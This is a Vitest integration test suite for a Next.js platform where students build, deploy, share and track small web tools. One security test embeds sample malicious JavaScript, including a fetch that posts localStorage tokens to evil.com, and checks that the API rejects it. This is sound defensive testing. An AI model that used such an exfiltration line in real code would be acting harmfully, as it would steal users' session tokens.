import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { NextRequest } from 'next/server';

// Import the actual API route handlers
import { GET as toolsGET, POST as toolsPOST, PUT as toolsPUT } from '../../app/api/tools/route';
import { GET as toolGET, PUT as toolPUT, DELETE as toolDELETE } from '../../app/api/tools/[toolId]/route';
import { POST as deployPOST } from '../../app/api/tools/[toolId]/deploy/route';
import { GET as stateGET, POST as statePOST } from '../../app/api/tools/[toolId]/state/route';
import { POST as sharePOST } from '../../app/api/tools/[toolId]/share/route';
import { GET as analyticsGET } from '../../app/api/tools/[toolId]/analytics/route';
import { POST as executePOST } from '../../app/api/tools/execute/route';

// Mock Firebase
vi.mock('firebase/firestore', () => ({
  collection: vi.fn(),
  doc: vi.fn(),
  getDoc: vi.fn(),
  setDoc: vi.fn(),
  updateDoc: vi.fn(),
  deleteDoc: vi.fn(),
  addDoc: vi.fn(),
  query: vi.fn(),
  where: vi.fn(),
  getDocs: vi.fn(),
  orderBy: vi.fn(),
  limit: vi.fn(),
  startAfter: vi.fn(),
  Timestamp: {
    now: vi.fn(() => ({ toDate: () => new Date() }))
  }
}));

vi.mock('@hive/core/server', () => ({
  db: {}
}));

vi.mock('@/lib/server-auth', () => ({
  getCurrentUser: vi.fn()
}));

import { 
  collection, doc, getDoc, setDoc, updateDoc, deleteDoc, addDoc,
  query, where, getDocs, orderBy, limit as fbLimit, startAfter, Timestamp
} from 'firebase/firestore';
import { getCurrentUser } from '@/lib/server-auth';

// Mock console methods
const consoleSpy = {
  error: vi.spyOn(console, 'error').mockImplementation(() => {}),
};

describe('Tools Development Integration Tests', () => {
  const mockUser = {
    uid: 'user-123',
    email: 'builder@university.edu',
    displayName: 'Builder User'
  };

  const mockBuilderUser = {
    uid: 'builder-456',
    email: 'expert@university.edu',
    displayName: 'Expert Builder'
  };

  const mockTool = {
    id: 'tool-123',
    name: 'Study Timer',
    description: 'A pomodoro timer for focused study sessions',
    type: 'productivity',
    category: 'time_management',
    createdBy: 'user-123',
    createdAt: '2024-01-15T10:00:00Z',
    updatedAt: '2024-01-15T10:00:00Z',
    version: '1.0.0',
    status: 'draft',
    isPublic: false,
    configuration: {
      runtime: 'browser',
      framework: 'react',
      dependencies: ['@types/react'],
      permissions: ['timer']
    },
    code: {
      html: '<div id="timer">25:00</div>',
      css: '.timer { font-size: 2rem; text-align: center; }',
      javascript: 'function startTimer() { /* implementation */ }'
    },
    metadata: {
      tags: ['productivity', 'study', 'timer'],
      targetAudience: 'students',
      difficulty: 'beginner',
      estimatedUsage: 'daily'
    },
    analytics: {
      views: 0,
      installs: 0,
      ratings: [],
      averageRating: 0,
      usageStats: {
        dailyActiveUsers: 0,
        totalSessions: 0,
        averageSessionTime: 0
      }
    }
  };

  const mockDeployment = {
    id: 'deploy-123',
    toolId: 'tool-123',
    version: '1.0.0',
    status: 'building',
    createdAt: '2024-01-15T11:00:00Z',
    buildLogs: [],
    deployedUrl: null,
    environment: 'production',
    configuration: {
      instanceType: 'micro',
      region: 'us-east-1',
      autoScale: false
    }
  };

  const mockToolState = {
    toolId: 'tool-123',
    userId: 'user-123',
    state: {
      currentTimer: 1500,
      isRunning: false,
      sessionsCompleted: 0,
      totalStudyTime: 0
    },
    lastUpdated: '2024-01-15T12:00:00Z'
  };

  beforeEach(() => {
    vi.clearAllMocks();
    consoleSpy.error.mockClear();

    // Setup default mocks
    vi.mocked(getCurrentUser).mockResolvedValue(mockUser);
    vi.mocked(doc).mockReturnValue({} as any);
    vi.mocked(collection).mockReturnValue({} as any);
    vi.mocked(query).mockReturnValue({} as any);
    vi.mocked(where).mockReturnValue({} as any);
    vi.mocked(orderBy).mockReturnValue({} as any);
    vi.mocked(fbLimit).mockReturnValue({} as any);
    vi.mocked(startAfter).mockReturnValue({} as any);
    vi.mocked(Timestamp.now).mockReturnValue({ toDate: () => new Date() } as any);

    vi.mocked(getDoc).mockResolvedValue({
      exists: () => true,
      id: 'tool-123',
      data: () => mockTool
    } as any);
    
    vi.mocked(setDoc).mockResolvedValue(undefined);
    vi.mocked(updateDoc).mockResolvedValue(undefined);
    vi.mocked(deleteDoc).mockResolvedValue(undefined);
    vi.mocked(addDoc).mockResolvedValue({ id: 'new-doc-123' } as any);
    
    vi.mocked(getDocs).mockResolvedValue({
      docs: [
        { id: 'tool-123', data: () => mockTool }
      ],
      size: 1,
      empty: false
    } as any);
  });

  afterEach(() => {
    vi.resetAllMocks();
  });

  describe('Complete Tool Development Lifecycle', () => {
    it('completes full tool lifecycle: create → develop → test → deploy → share → analytics', async () => {
      // Step 1: Create a new tool
      const createRequest = new NextRequest('http://localhost/api/tools', {
        method: 'POST',
        body: JSON.stringify({
          name: 'Grade Calculator',
          description: 'Calculate GPA and course grades',
          type: 'educational',
          category: 'calculation',
          configuration: {
            framework: 'vanilla',
            permissions: ['storage']
          },
          code: {
            html: '<div id="calculator"></div>',
            css: '.calculator { padding: 20px; }',
            javascript: 'function calculateGPA() { /* implementation */ }'
          },
          metadata: {
            tags: ['education', 'grades', 'calculator'],
            difficulty: 'intermediate'
          }
        })
      });

      const createResponse = await toolsPOST(createRequest);
      const createData = await createResponse.json();

      expect(createResponse.status).toBe(201);
      expect(createData.success).toBe(true);
      expect(createData.tool.name).toBe('Grade Calculator');
      expect(createData.tool.createdBy).toBe(mockUser.uid);
      expect(createData.tool.status).toBe('draft');

      // Verify tool was saved
      expect(vi.mocked(setDoc)).toHaveBeenCalledWith(
        expect.anything(),
        expect.objectContaining({
          name: 'Grade Calculator',
          createdBy: mockUser.uid,
          status: 'draft'
        })
      );

      // Step 2: Update tool during development
      const updateRequest = new NextRequest('http://localhost/api/tools/tool-123', {
        method: 'PUT',
        body: JSON.stringify({
          code: {
            html: '<div id="calculator"><input type="number" id="grade" /></div>',
            css: '.calculator { padding: 20px; border: 1px solid #ccc; }',
            javascript: 'function calculateGPA(grades) { return grades.reduce((a,b) => a+b) / grades.length; }'
          },
          version: '1.1.0'
        })
      });

      const updateResponse = await toolPUT(updateRequest, { params: { toolId: 'tool-123' } });
      const updateData = await updateResponse.json();

      expect(updateResponse.status).toBe(200);
      expect(updateData.success).toBe(true);
      expect(updateData.tool.version).toBe('1.1.0');

      // Step 3: Test tool execution
      const executeRequest = new NextRequest('http://localhost/api/tools/execute', {
        method: 'POST',
        body: JSON.stringify({
          toolId: 'tool-123',
          input: {
            grades: [85, 92, 78, 95],
            credits: [3, 4, 3, 2]
          },
          context: {
            userId: mockUser.uid,
            spaceId: 'space-123'
          }
        })
      });

      const executeResponse = await executePOST(executeRequest);
      const executeData = await executeResponse.json();

      expect(executeResponse.status).toBe(200);
      expect(executeData.success).toBe(true);
      expect(executeData.result).toBeDefined();

      // Step 4: Deploy the tool
      const deployRequest = new NextRequest('http://localhost/api/tools/tool-123/deploy', {
        method: 'POST',
        body: JSON.stringify({
          environment: 'production',
          configuration: {
            instanceType: 'small',
            autoScale: true
          }
        })
      });

      vi.mocked(addDoc).mockResolvedValueOnce({ id: 'deploy-456' } as any);

      const deployResponse = await deployPOST(deployRequest, { params: { toolId: 'tool-123' } });
      const deployData = await deployResponse.json();

      expect(deployResponse.status).toBe(200);
      expect(deployData.success).toBe(true);
      expect(deployData.deployment.status).toBe('building');

      // Step 5: Share the tool
      const shareRequest = new NextRequest('http://localhost/api/tools/tool-123/share', {
        method: 'POST',
        body: JSON.stringify({
          shareWith: ['space-123', 'user-456'],
          permissions: ['read', 'execute'],
          message: 'Check out my new grade calculator!'
        })
      });

      const shareResponse = await sharePOST(shareRequest, { params: { toolId: 'tool-123' } });
      const shareData = await shareResponse.json();

      expect(shareResponse.status).toBe(200);
      expect(shareData.success).toBe(true);
      expect(shareData.shared.length).toBe(2);

      // Step 6: Track analytics
      const analyticsRequest = new NextRequest('http://localhost/api/tools/tool-123/analytics');

      vi.mocked(getDoc).mockResolvedValueOnce({
        exists: () => true,
        data: () => ({
          ...mockTool.analytics,
          views: 45,
          installs: 12,
          usageStats: {
            dailyActiveUsers: 8,
            totalSessions: 156,
            averageSessionTime: 245000
          }
        })
      } as any);

      const analyticsResponse = await analyticsGET(analyticsRequest, { params: { toolId: 'tool-123' } });
      const analyticsData = await analyticsResponse.json();

      expect(analyticsResponse.status).toBe(200);
      expect(analyticsData.success).toBe(true);
      expect(analyticsData.analytics.views).toBe(45);
      expect(analyticsData.analytics.usageStats.dailyActiveUsers).toBe(8);
    });

    it('handles tool state persistence and retrieval', async () => {
      // Step 1: Save tool state
      const saveStateRequest = new NextRequest('http://localhost/api/tools/tool-123/state', {
        method: 'POST',
        body: JSON.stringify({
          state: {
            currentTimer: 900,
            isRunning: true,
            sessionsCompleted: 2,
            totalStudyTime: 3600
          }
        })
      });

      const saveStateResponse = await statePOST(saveStateRequest, { params: { toolId: 'tool-123' } });
      const saveStateData = await saveStateResponse.json();

      expect(saveStateResponse.status).toBe(200);
      expect(saveStateData.success).toBe(true);

      // Verify state was saved
      expect(vi.mocked(setDoc)).toHaveBeenCalledWith(
        expect.anything(),
        expect.objectContaining({
          toolId: 'tool-123',
          userId: mockUser.uid,
          state: {
            currentTimer: 900,
            isRunning: true,
            sessionsCompleted: 2,
            totalStudyTime: 3600
          }
        })
      );

      // Step 2: Retrieve tool state
      vi.mocked(getDoc).mockResolvedValueOnce({
        exists: () => true,
        data: () => mockToolState
      } as any);

      const getStateRequest = new NextRequest('http://localhost/api/tools/tool-123/state');

      const getStateResponse = await stateGET(getStateRequest, { params: { toolId: 'tool-123' } });
      const getStateData = await getStateResponse.json();

      expect(getStateResponse.status).toBe(200);
      expect(getStateData.success).toBe(true);
      expect(getStateData.state.currentTimer).toBe(1500);
      expect(getStateData.state.sessionsCompleted).toBe(0);
    });

    it('manages tool versioning and rollbacks', async () => {
      // Step 1: Create version 2.0.0
      const updateRequest = new NextRequest('http://localhost/api/tools/tool-123', {
        method: 'PUT',
        body: JSON.stringify({
          version: '2.0.0',
          description: 'Updated with new features',
          code: {
            html: '<div id="enhanced-timer"></div>',
            css: '.enhanced-timer { /* new styles */ }',
            javascript: 'function enhancedTimer() { /* new implementation */ }'
          },
          changelog: 'Added sound notifications and custom intervals'
        })
      });

      const updateResponse = await toolPUT(updateRequest, { params: { toolId: 'tool-123' } });
      const updateData = await updateResponse.json();

      expect(updateResponse.status).toBe(200);
      expect(updateData.tool.version).toBe('2.0.0');

      // Verify version history was created
      expect(vi.mocked(addDoc)).toHaveBeenCalledWith(
        expect.anything(),
        expect.objectContaining({
          toolId: 'tool-123',
          version: '2.0.0',
          changelog: 'Added sound notifications and custom intervals',
          createdAt: expect.any(String)
        })
      );

      // Step 2: Rollback to previous version
      const rollbackRequest = new NextRequest('http://localhost/api/tools/tool-123', {
        method: 'PUT',
        body: JSON.stringify({
          action: 'rollback',
          targetVersion: '1.0.0'
        })
      });

      const rollbackResponse = await toolPUT(rollbackRequest, { params: { toolId: 'tool-123' } });
      const rollbackData = await rollbackResponse.json();

      expect(rollbackResponse.status).toBe(200);
      expect(rollbackData.success).toBe(true);
      expect(rollbackData.tool.version).toBe('1.0.0');
    });

    it('handles collaborative tool development', async () => {
      // Step 1: Add collaborator
      const addCollaboratorRequest = new NextRequest('http://localhost/api/tools/tool-123', {
        method: 'PUT',
        body: JSON.stringify({
          action: 'add_collaborator',
          userId: 'builder-456',
          permissions: ['read', 'write', 'deploy']
        })
      });

      const addCollaboratorResponse = await toolPUT(addCollaboratorRequest, { params: { toolId: 'tool-123' } });
      const addCollaboratorData = await addCollaboratorResponse.json();

      expect(addCollaboratorResponse.status).toBe(200);
      expect(addCollaboratorData.success).toBe(true);

      // Step 2: Collaborator makes changes
      vi.mocked(getCurrentUser).mockResolvedValueOnce(mockBuilderUser);

      // Mock collaborator permission check
      vi.mocked(getDocs).mockResolvedValueOnce({
        docs: [{
          data: () => ({
            toolId: 'tool-123',
            userId: 'builder-456',
            permissions: ['read', 'write', 'deploy'],
            role: 'collaborator'
          })
        }],
        empty: false
      } as any);

      const collaboratorUpdateRequest = new NextRequest('http://localhost/api/tools/tool-123', {
        method: 'PUT',
        body: JSON.stringify({
          code: {
            javascript: 'function improvedTimer() { /* better implementation */ }'
          },
          version: '1.2.0',
          changelog: 'Performance improvements by collaborator'
        })
      });

      const collaboratorUpdateResponse = await toolPUT(collaboratorUpdateRequest, { params: { toolId: 'tool-123' } });
      const collaboratorUpdateData = await collaboratorUpdateResponse.json();

      expect(collaboratorUpdateResponse.status).toBe(200);
      expect(collaboratorUpdateData.success).toBe(true);
    });

    it('enforces tool permissions and access controls', async () => {
      // Test non-owner trying to modify tool
      vi.mocked(getCurrentUser).mockResolvedValueOnce({
        uid: 'user-789',
        email: 'student@university.edu',
        displayName: 'Regular Student'
      });

      // Mock no collaboration permissions
      vi.mocked(getDocs).mockResolvedValueOnce({
        empty: true,
        docs: []
      } as any);

      const unauthorizedUpdateRequest = new NextRequest('http://localhost/api/tools/tool-123', {
        method: 'PUT',
        body: JSON.stringify({
          name: 'Unauthorized Change'
        })
      });

      const unauthorizedResponse = await toolPUT(unauthorizedUpdateRequest, { params: { toolId: 'tool-123' } });
      const unauthorizedData = await unauthorizedResponse.json();

      expect(unauthorizedResponse.status).toBe(403);
      expect(unauthorizedData.error).toBe('You do not have permission to modify this tool');
    });

    it('validates tool code security and safety', async () => {
      const maliciousCode = {
        javascript: `
          eval('malicious code');
          document.cookie = 'stolen';
          fetch('http://evil.com/steal', { method: 'POST', body: localStorage.getItem('tokens') });
        `
      };

      const maliciousRequest = new NextRequest('http://localhost/api/tools/tool-123', {
        method: 'PUT',
        body: JSON.stringify({
          code: maliciousCode
        })
      });

      const response = await toolPUT(maliciousRequest, { params: { toolId: 'tool-123' } });
      const responseData = await response.json();

      expect(response.status).toBe(400);
      expect(responseData.error).toBe('Code contains prohibited functions or patterns');
    });
  });

  describe('Tool Marketplace and Discovery', () => {
    it('provides comprehensive tool browsing and filtering', async () => {
      const mockTools = [
        { ...mockTool, id: 'tool-1', name: 'Study Timer', type: 'productivity', isPublic: true },
        { ...mockTool, id: 'tool-2', name: 'Grade Calculator', type: 'educational', isPublic: true },
        { ...mockTool, id: 'tool-3', name: 'Schedule Builder', type: 'productivity', isPublic: true }
      ];

      vi.mocked(getDocs).mockResolvedValue({
        docs: mockTools.map(tool => ({
          id: tool.id,
          data: () => tool
        })),
        size: mockTools.length
      } as any);

      // Step 1: Browse all public tools
      const browseRequest = new NextRequest('http://localhost/api/tools?public=true');

      const browseResponse = await toolsGET(browseRequest);
      const browseData = await browseResponse.json();

      expect(browseResponse.status).toBe(200);
      expect(browseData.tools).toHaveLength(3);

      // Step 2: Filter by type
      const productivityRequest = new NextRequest('http://localhost/api/tools?type=productivity&public=true');

      vi.mocked(getDocs).mockResolvedValueOnce({
        docs: mockTools.filter(t => t.type === 'productivity').map(tool => ({
          id: tool.id,
          data: () => tool
        })),
        size: 2
      } as any);

      const productivityResponse = await toolsGET(productivityRequest);
      const productivityData = await productivityResponse.json();

      expect(productivityResponse.status).toBe(200);
      expect(productivityData.tools).toHaveLength(2);
      expect(productivityData.tools.every((t: any) => t.type === 'productivity')).toBe(true);

      // Step 3: Search by name
      const searchRequest = new NextRequest('http://localhost/api/tools?search=timer&public=true');

      const searchResponse = await toolsGET(searchRequest);
      const searchData = await searchResponse.json();

      expect(searchResponse.status).toBe(200);
      expect(searchData.tools.some((t: any) => t.name.toLowerCase().includes('timer'))).toBe(true);
    });

    it('handles tool installation and uninstallation', async () => {
      // Mock tool to install
      const publicTool = { ...mockTool, isPublic: true, createdBy: 'other-user' };
      vi.mocked(getDoc).mockResolvedValueOnce({
        exists: () => true,
        data: () => publicTool
      } as any);

      // Step 1: Install tool
      const installRequest = new NextRequest('http://localhost/api/tools', {
        method: 'POST',
        body: JSON.stringify({
          action: 'install',
          toolId: 'tool-123',
          spaceId: 'space-456'
        })
      });

      const installResponse = await toolsPOST(installRequest);
      const installData = await installResponse.json();

      expect(installResponse.status).toBe(200);
      expect(installData.success).toBe(true);
      expect(installData.installation.toolId).toBe('tool-123');

      // Verify installation was recorded
      expect(vi.mocked(addDoc)).toHaveBeenCalledWith(
        expect.anything(),
        expect.objectContaining({
          toolId: 'tool-123',
          userId: mockUser.uid,
          spaceId: 'space-456',
          installedAt: expect.any(String)
        })
      );

      // Step 2: Uninstall tool
      const uninstallRequest = new NextRequest('http://localhost/api/tools/tool-123', {
        method: 'DELETE',
        body: JSON.stringify({
          action: 'uninstall',
          spaceId: 'space-456'
        })
      });

      const uninstallResponse = await toolDELETE(uninstallRequest, { params: { toolId: 'tool-123' } });
      const uninstallData = await uninstallResponse.json();

      expect(uninstallResponse.status).toBe(200);
      expect(uninstallData.success).toBe(true);
    });
  });

  describe('Tool Performance and Monitoring', () => {
    it('tracks detailed tool usage analytics', async () => {
      const request = new NextRequest('http://localhost/api/tools/tool-123/analytics?detailed=true');

      vi.mocked(getDoc).mockResolvedValueOnce({
        exists: () => true,
        data: () => ({
          ...mockTool.analytics,
          detailedMetrics: {
            performanceStats: {
              averageLoadTime: 245,
              errorRate: 0.02,
              crashFrequency: 0.001
            },
            userBehavior: {
              averageSessionDuration: 1234000,
              bounceRate: 0.15,
              returnUserRate: 0.67
            }
          }
        })
      } as any);

      const response = await analyticsGET(request, { params: { toolId: 'tool-123' } });
      const responseData = await response.json();

      expect(response.status).toBe(200);
      expect(responseData.analytics.detailedMetrics).toBeDefined();
      expect(responseData.analytics.detailedMetrics.performanceStats.averageLoadTime).toBe(245);
    });

    it('monitors tool deployment health', async () => {
      const deployment = {
        ...mockDeployment,
        status: 'deployed',
        healthChecks: {
          uptime: 0.995,
          responseTime: 156,
          errorRate: 0.008,
          lastCheck: '2024-01-15T14:00:00Z'
        }
      };

      vi.mocked(getDoc).mockResolvedValue({
        exists: () => true,
        data: () => deployment
      } as any);

      const healthRequest = new NextRequest('http://localhost/api/tools/tool-123/deploy?health=true');

      const healthResponse = await deployPOST(healthRequest, { params: { toolId: 'tool-123' } });
      const healthData = await healthResponse.json();

      expect(healthResponse.status).toBe(200);
      expect(healthData.deployment.healthChecks.uptime).toBe(0.995);
    });
  });

  describe('Error Handling and Edge Cases', () => {
    it('handles invalid tool code compilation', async () => {
      const invalidCode = {
        javascript: 'function broken() { invalid syntax here }'
      };

      const request = new NextRequest('http://localhost/api/tools/tool-123', {
        method: 'PUT',
        body: JSON.stringify({
          code: invalidCode,
          validateCode: true
        })
      });

      const response = await toolPUT(request, { params: { toolId: 'tool-123' } });
      const responseData = await response.json();

      expect(response.status).toBe(400);
      expect(responseData.error).toBe('Code compilation failed');
      expect(responseData.details).toContain('syntax');
    });

    it('manages deployment failures and rollbacks', async () => {
      // Mock deployment failure
      vi.mocked(addDoc).mockRejectedValueOnce(new Error('Deployment service unavailable'));

      const deployRequest = new NextRequest('http://localhost/api/tools/tool-123/deploy', {
        method: 'POST',
        body: JSON.stringify({
          environment: 'production'
        })
      });

      const deployResponse = await deployPOST(deployRequest, { params: { toolId: 'tool-123' } });
      const deployData = await deployResponse.json();

      expect(deployResponse.status).toBe(500);
      expect(deployData.error).toBe('Deployment failed');
      expect(consoleSpy.error).toHaveBeenCalled();
    });

    it('prevents tool deletion with active deployments', async () => {
      // Mock active deployment
      vi.mocked(getDocs).mockResolvedValueOnce({
        docs: [{
          data: () => ({ ...mockDeployment, status: 'deployed' })
        }],
        empty: false
      } as any);

      const deleteRequest = new NextRequest('http://localhost/api/tools/tool-123?confirm=true', {
        method: 'DELETE'
      });

      const deleteResponse = await toolDELETE(deleteRequest, { params: { toolId: 'tool-123' } });
      const deleteData = await deleteResponse.json();

      expect(deleteResponse.status).toBe(400);
      expect(deleteData.error).toBe('Cannot delete tool with active deployments');
    });

    it('handles concurrent tool modifications', async () => {
      // Simulate two users editing the same tool simultaneously
      const update1 = toolPUT(new NextRequest('http://localhost/api/tools/tool-123', {
        method: 'PUT',
        body: JSON.stringify({
          name: 'Updated by User 1',
          version: '1.1.0'
        })
      }), { params: { toolId: 'tool-123' } });

      const update2 = toolPUT(new NextRequest('http://localhost/api/tools/tool-123', {
        method: 'PUT',
        body: JSON.stringify({
          name: 'Updated by User 2',
          version: '1.1.0'
        })
      }), { params: { toolId: 'tool-123' } });

      const [response1, response2] = await Promise.all([update1, update2]);

      // One should succeed, one should fail due to version conflict
      expect([response1.status, response2.status]).toContain(200);
      expect([response1.status, response2.status]).toContain(409);
    });

    it('validates tool resource limits', async () => {
      const resourceIntensiveTool = {
        code: {
          javascript: 'while(true) { /* infinite loop */ }'
        },
        configuration: {
          resources: {
            maxMemory: '10GB', // Excessive
            maxCpu: '8 cores'  // Excessive
          }
        }
      };

      const request = new NextRequest('http://localhost/api/tools/tool-123', {
        method: 'PUT',
        body: JSON.stringify(resourceIntensiveTool)
      });

      const response = await toolPUT(request, { params: { toolId: 'tool-123' } });
      const responseData = await response.json();

      expect(response.status).toBe(400);
      expect(responseData.error).toBe('Resource requirements exceed limits');
    });

    it('handles database failures during tool operations', async () => {
      vi.mocked(updateDoc).mockRejectedValue(new Error('Database write failed'));

      const request = new NextRequest('http://localhost/api/tools/tool-123', {
        method: 'PUT',
        body: JSON.stringify({
          description: 'Updated description'
        })
      });

      const response = await toolPUT(request, { params: { toolId: 'tool-123' } });
      const responseData = await response.json();

      expect(response.status).toBe(500);
      expect(responseData.error).toBe('Failed to update tool');
      expect(consoleSpy.error).toHaveBeenCalled();
    });
  });
});